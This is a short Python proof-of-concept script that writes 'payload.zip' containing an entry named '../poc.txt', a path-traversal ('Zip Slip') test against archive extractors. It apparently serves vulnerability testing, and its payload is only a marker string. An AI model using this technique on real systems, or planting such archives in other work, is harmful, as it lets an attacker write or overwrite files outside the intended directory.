import zipfile

def compress_file(filename):
    with zipfile.ZipFile('payload.zip', 'w') as zipf:
        zipf.writestr(filename, "PoC")

filename = '../poc.txt'

compress_file(filename)
